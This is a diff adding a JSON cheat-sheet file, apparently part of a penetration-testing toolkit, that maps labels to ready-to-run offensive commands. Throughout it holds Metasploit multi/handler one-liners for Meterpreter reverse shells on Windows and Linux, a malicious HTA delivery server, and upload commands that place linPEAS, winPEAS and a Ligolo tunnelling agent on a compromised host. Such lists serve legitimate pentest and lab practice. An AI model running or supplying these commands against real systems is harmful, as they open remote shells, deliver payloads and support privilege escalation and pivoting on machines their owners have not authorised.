@@ -1,0 +1,28 @@
+{
+    "Hander":
+    {
+        "Generic":"msfconsole -q -x 'setg lport 443; setg lhost tun0; use exploit/multi/handler;run'",
+
+        "Windows x64 (Met) Staged":"msfconsole -q -x 'setg lport 443; setg lhost tun0; use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; run'",
+        "Windows x64 (Met) Stageless":"msfconsole -q -x 'setg lport 443; setg lhost tun0; use exploit/multi/handler; set payload windows/x64/meterpreter_reverse_tcp; run'",
+        "Windows x86 (Met) Staged":"msfconsole -q -x 'setg lport 443; setg lhost tun0; use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; run'",
+        "Windows x86 (Met) Stageless":"msfconsole -q -x 'setg lport 443; setg lhost tun0; use exploit/multi/handler; set payload windows/meterpreter_reverse_tcp; run'",
+        
+        "Linux x64 (Met) Staged":"msfconsole -q -x 'setg lport 443; setg lhost tun0; use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; run'",
+        "Linux x64 (Met) Stageless":"msfconsole -q -x 'setg lport 443; setg lhost tun0; use exploit/multi/handler; set payload linux/x64/meterpreter_reverse_tcp; run'",
+        "Linux x86 (Met) Staged":"msfconsole -q -x 'setg lport 443; setg lhost tun0; use exploit/multi/handler; set payload linux/meterpreter/reverse_tcp; run'",
+        "Linux x86 (Met) Stageless":"msfconsole -q -x 'setg lport 443; setg lhost tun0; use exploit/multi/handler; set payload linux/meterpreter_reverse_tcp; run'"
+    },
+    "Windows":
+    {
+        "Malicious HTA":"msfconsole -q -x 'setg lport 443; setg lhost tun0; use exploit/windows/misc/hta_server; set srvport 8081; run'"
+    }
+    ,
+    "Uploads":
+    {
+        "Linpeas":"upload /usr/share/peass/linpeas/linpeas.sh /tmp/linpeas.sh",
+        "Winpeas":"upload /usr/share/peass/winpeas/winPEASany.exe C:\\Windows\\Tasks\\winpeas.exe",
+        "Ligolo Agent (Windows)":"upload ~/BITREAVER-TOOLS/Windows/Binaries/ligolo-agent.exe C:\\Windows\\Tasks\\ligolo.exe",
+        "Ligolo Agent (Linux)":"upload ~/BITREAVER-TOOLS/Windows/Binaries/ligolo-agent /tmp/ligolo"
+    }
+}
